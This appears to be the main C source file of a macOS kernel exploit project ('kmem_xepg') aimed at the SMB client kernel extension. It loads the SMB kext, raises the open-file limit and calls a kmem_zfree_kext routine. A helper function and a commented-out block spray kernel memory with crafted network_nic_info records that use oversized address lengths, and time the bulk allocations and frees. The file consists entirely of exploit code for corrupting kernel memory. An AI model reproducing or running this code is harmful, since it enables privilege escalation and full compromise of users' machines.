//
//  main.c
//  kmem_xepg
//
//  Created by admin on 12/18/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdatomic.h>

#include <libproc.h>
#include <dispatch/dispatch.h>

#include <sys/time.h>
#include <sys/errno.h>
#include <arpa/inet.h>
#include <sys/un.h>

#include "smb/client.h"
#include "nic_allocator.h"
#include "ssn_allocator.h"
#include "kmem/allocator_nic_parallel.h"
#include "xnu/saddr_allocator.h"
#include "platform_constants.h"
#include "util_misc.h"
#include "util_binary.h"
#include "util_dispatch.h"
#include "kmem/zfree_kext.h"


void allocate_sockets(smb_nic_allocator allocator, int nic_index, size_t count, uint8_t saddr_size) {
    size_t done = 0;
    size_t max_batch_size = 1024;
    while (done < count) {
        size_t batch_size = XE_MIN(max_batch_size, count - done);
        struct network_nic_info* infos = malloc(sizeof(struct network_nic_info) * batch_size + saddr_size);
        bzero(infos, sizeof(struct network_nic_info) * batch_size);
        for (int sock_idx=0; sock_idx < batch_size; sock_idx++) {
            struct network_nic_info* info = &infos[sock_idx];
            info->nic_index = nic_index;
            info->addr_4.sin_family = AF_INET;
            info->addr_4.sin_len = saddr_size;
            info->addr_4.sin_port = htons(1234);
            info->addr_4.sin_addr.s_addr = (uint32_t)done + sock_idx;
            info->next_offset = sizeof(*info);
        }
        int error = smb_nic_allocator_allocate(allocator, infos, (uint32_t)batch_size, (uint32_t)(sizeof(struct network_nic_info) * batch_size + saddr_size));
        assert(error == 0);
        free(infos);
        done += batch_size;
    }
}


int main(void) {
    smb_client_load_kext();
    
    struct rlimit nofile_limit;
    int res = getrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);
    nofile_limit.rlim_cur = nofile_limit.rlim_max;
    res = setrlimit(RLIMIT_NOFILE, &nofile_limit);
    assert(res == 0);
    
    struct sockaddr_in saddr;
    bzero(&saddr, sizeof(saddr));
    saddr.sin_family = AF_INET;
    saddr.sin_len = sizeof(saddr);
    saddr.sin_port = htons(8090);
    inet_aton("127.0.0.1", &saddr.sin_addr);
    
    kmem_zfree_kext(&saddr, 0);
    
//    printf("%lu %lu\n", offsetof(struct sockaddr_in, sin_addr), sizeof(saddr.sin_addr));
//
//
//    kmem_allocator_nic_parallel_t parallel_allocator = kmem_allocator_nic_parallel_create(&saddr, 502400);
//    char data[96 - 8];
//    memset(data, 0xa, sizeof(data));
//
//    struct timespec start;
//    clock_gettime(CLOCK_MONOTONIC, &start);
//    kmem_allocator_nic_parallel_alloc(parallel_allocator, data, sizeof(data));
//    struct timespec end;
//    clock_gettime(CLOCK_MONOTONIC, &end);
//    long ds = end.tv_sec - start.tv_sec;
//    long dns = end.tv_nsec - start.tv_nsec;
//    long total_ns = ds * 1000000000 + dns;
//    double seconds = (double)total_ns / 1e9;
//    printf("took %fs to allocate\n", seconds);
//
//
//    smb_nic_allocator allocator;
//    int error = smb_nic_allocator_create(&saddr, sizeof(saddr), &allocator);
//    assert(error == 0);
//
//    int num_nics = 100;
//    for (int i=0; i<num_nics; i++) {
//        printf("%d / %d\n", i, num_nics);
//        allocate_sockets(allocator, i, 20240, 255);
//    }
//
//    clock_gettime(CLOCK_MONOTONIC, &start);
//    smb_nic_allocator_destroy(&allocator);
//    clock_gettime(CLOCK_MONOTONIC, &end);
//
//    ds = end.tv_sec - start.tv_sec;
//    dns = end.tv_nsec - start.tv_nsec;
//    total_ns = ds * 1000000000 + dns;
//    seconds = (double)total_ns / 1e9;
//
//    printf("took %fs to free\n", seconds);
}
